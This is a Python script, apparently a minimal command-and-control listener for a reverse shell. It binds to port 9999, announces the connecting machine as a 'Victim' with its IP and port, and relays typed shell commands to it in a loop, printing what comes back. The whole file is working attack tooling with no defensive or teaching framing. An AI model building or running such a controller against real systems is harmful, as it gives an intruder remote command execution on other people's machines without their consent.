import socket
import sys

# Create socket
def create_socket():
	try:
		global host
		global port
		global s
		host = ''
		port = 9999
		s = socket.socket()
	except socket.error as ex:
		print('Socket creation error: ', str(ex))

# Binding socket & listening	
def bind_socket():
	try:
		global host
		global port
		global s
		host = ''
		port = 9999
		print('Listening on port: ', str(port))
		s.bind((host,port))
		s.listen(1)
	except socket.error as ex:
		print('Binding error: ', str(ex), '\nRetrying...')
		bind_socket()

# Establish connection
def socket_accept():
	conn,addr = s.accept()
	print('(-_-) Victim is here!\nIP = ' + addr[0] + ' / PORT = ' + str(addr[1]))
	send_commands(conn)
	conn.close()
	
# Send Commands
def send_commands(conn):
	while True:
		cmd = input('Input command: ')
		if cmd == 'quit':
			print('Connection stopped')
			conn.close()
			s.close()
			sys.exit()
		if len(cmd.encode()) > 0:
			conn.send(cmd.encode())
			get_response = conn.recv(4096).decode('UTF-8', 'ignore')
			print(get_response)
	

def main():
	create_socket()
	bind_socket()
	socket_accept()

main()
			
			
		
	
	
	
